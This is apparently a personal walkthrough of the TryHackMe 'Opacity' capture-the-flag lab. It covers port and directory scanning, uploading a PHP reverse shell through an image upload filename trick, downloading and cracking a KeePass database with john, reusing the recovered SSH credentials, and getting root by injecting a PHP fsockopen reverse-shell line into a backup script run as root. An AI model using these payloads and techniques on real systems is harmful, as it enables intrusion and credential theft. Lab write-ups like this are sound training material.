Opacity IP:


rustscan:
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack



nmap:



PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13362/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54417/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23220/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7492/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-17T13:44:54
|_  start_date: N/A



smbclient:

smbmap -H 10.10.225.115                                      
[+] IP: 10.10.225.115:445       Name: 10.10.225.115                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (opacity server (Samba, Ubuntu))






nikto:


gobuster:

gobuster dir  -u http://10.10.225.115 -w /usr/share/wordlists/dirb/common.txt -t 64                                                                                                          2 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.225.115
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/05/17 09:45:19 Starting gobuster
===============================================================
/css (Status: 301)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 302)
/server-status (Status: 403)



 gobuster dir  -u http://10.10.225.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.225.115
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/05/17 09:45:42 Starting gobuster
===============================================================
/css (Status: 301)
/cloud (Status: 301)
/server-status (Status: 403)
===============================================================
2023/05/17 09:50:34 Finished
===============================================================


gobuster dir  -u http://10.10.225.115/cloud/ -w /usr/share/wordlists/dirb/common.txt -t 64 -x txt,php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.225.115/cloud/
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2023/05/17 09:55:22 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/storage.php (Status: 200)
===============================================================
2023/05/17 09:55:50 Finished
===============================================================




Foothold

on port 80/cloud/index.php there is an image upload functionality. so we upload a php reverse shell and we name it shell.php#a.png. remember that the original php file must be named shell.php

 sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.128.94 - - [18/May/2023 08:17:47] "GET /shell.php HTTP/1.1" 200 -



nc -lnvp 1234                                                                                                                                                                                1 ⨯
listening on [any] 1234 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.128.94] 54482
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 12:17:50 up  1:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@opacity:/$ ls
ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
www-data@opacity:/$ cd opt
cd opt
www-data@opacity:/opt$ ls
ls
dataset.kdbx
www-data@opacity:/opt$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.29.89 - - [18/May/2023 12:19:36] "GET /dataset.kdbx HTTP/1.1" 200 -


in the opt file there is a dataset.kdbx file, we host it and then download it to the local machine

after an inspection, we see that is a keepass file

file dataset.kdbx                
dataset.kdbx: Keepass password database 2.x KDBX


we can use a functionality of john to get the a hash, and then we can crack it:

──(kali㉿kali)-[~/Practice/tryhackme/Opacity]
└─$ keepass2john dataset.kdbx > hash
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/tryhackme/Opacity]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:02 DONE (2023-05-18 08:23) 0.4132g/s 366.9p/s 366.9c/s 366.9C/s chichi..simpsons
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


when we open the file,we have a credential:

sysadmin
Cl0udP4ss40p4city#8700


we try this on the ssh:

┌──(kali㉿kali)-[~/Practice/tryhackme/Opacity]
└─$ crackmapexec ssh  10.10.128.94 -u sysadmin  -p 'Cl0udP4ss40p4city#8700'                                                                                                                      2 ⨯
SSH         10.10.128.94    22     10.10.128.94     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
SSH         10.10.128.94    22     10.10.128.94     [+] sysadmin:Cl0udP4ss40p4city#8700 





sysadmin@opacity:~$ ls
local.txt  scripts
sysadmin@opacity:~$ cat local.txt 
6661b61b44d234d230d06bf5b3c075e2
sysadmin@opacity:~$ 


user flag:6661b61b44d234d230d06bf5b3c075e2


PRIVESC:

there is a script called script.php that runs another script inside. we modify the backup.inc.php with an added line to get a reverse shell as root. we need to cp the backup.inc.php to home folder in order to modify it.after this we move it back to the original folder, start a nc listener and wait for a connetion.


sysadmin@opacity:~$ cd /home/sysadmin/scripts/
sysadmin@opacity:~/scripts$ ls
lib  script.php
sysadmin@opacity:~/scripts$ cat script.php 
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
sysadmin@opacity:~/scripts$ ls -la
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 8 sysadmin sysadmin 4096 May 18 14:35 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
sysadmin@opacity:~/scripts$ cd lib
sysadmin@opacity:~/scripts/lib$ ls
application.php  backup.inc.php  bio2rdfapi.php  biopax2bio2rdf.php  dataresource.php  dataset.php  fileapi.php  owlapi.php  phplib.php  rdfapi.php  registry.php  utils.php  xmlapi.php
sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
        if (extension_loaded('zip')) {
                if (file_exists($source)) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
                                $source = realpath($source);
                                if (is_dir($source)) {
                                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                                        foreach ($files as $file) {
                                                $file = realpath($file);
                                                if (is_dir($file)) {
                                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                                } else if (is_file($file)) {
                                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                                                }
                                        }
                                } else if (is_file($source)) {
                                        $zip->addFromString(basename($source), file_get_contents($source));
                                }
                        }
                        return $zip->close();
                }
        }
        return false;
}
?>
sysadmin@opacity:~/scripts/lib$ cp backup.inc.php /home/
cp: cannot create regular file '/home/backup.inc.php': Permission denied
sysadmin@opacity:~/scripts/lib$ cp backup.inc.php /home/sysadmin/
sysadmin@opacity:~/scripts/lib$ cd ..
sysadmin@opacity:~/scripts$ cd ..
sysadmin@opacity:~$ ls
backup.inc.php  exp_dir  exp_file_credential  linpeas.sh  linpeas.txt  local.txt  scripts  shell.elf  snap
sysadmin@opacity:~$ nano backup.inc.php 
sysadmin@opacity:~$ cp backup.inc.php /home/sysadmin/scripts/lib/
cp: cannot create regular file '/home/sysadmin/scripts/lib/backup.inc.php': Permission denied
sysadmin@opacity:~$ mv backup.inc.php /home/sysadmin/scripts/lib/
mv: replace '/home/sysadmin/scripts/lib/backup.inc.php', overriding mode 0644 (rw-r--r--)? yes
sysadmin@opacity:~$ pwd
/home/sysadmin
sysadmin@opacity:~$ cd scripts/
sysadmin@opacity:~/scripts$ cd lib
sysadmin@opacity:~/scripts/lib$ ls
application.php  backup.inc.php  bio2rdfapi.php  biopax2bio2rdf.php  dataresource.php  dataset.php  fileapi.php  owlapi.php  phplib.php  rdfapi.php  registry.php  utils.php  xmlapi.php
sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
<?php


$sock=fsockopen("10.8.29.89",9001);exec("sh <&3 >&3 2>&3");


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
        if (extension_loaded('zip')) {
                if (file_exists($source)) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
                                $source = realpath($source);
                                if (is_dir($source)) {
                                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                                        foreach ($files as $file) {
                                                $file = realpath($file);
                                                if (is_dir($file)) {
                                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                                } else if (is_file($file)) {
                                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                                                }
                                        }
                                } else if (is_file($source)) {
                                        $zip->addFromString(basename($source), file_get_contents($source));
                                }
                        }
                        return $zip->close();
                }
        }
        return false;
}
?>
sysadmin@opacity:~/scripts/lib$ 


nc -lnvp 9001                                                                                                              
listening on [any] 9001 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.168.65] 33082
id 
uid=0(root) gid=0(root) groups=0(root)
cd /root      
pwd
/root
ls
proof.txt
snap
cat proof.txt
ac0d56f93202dd57dcb2498c739fd20e
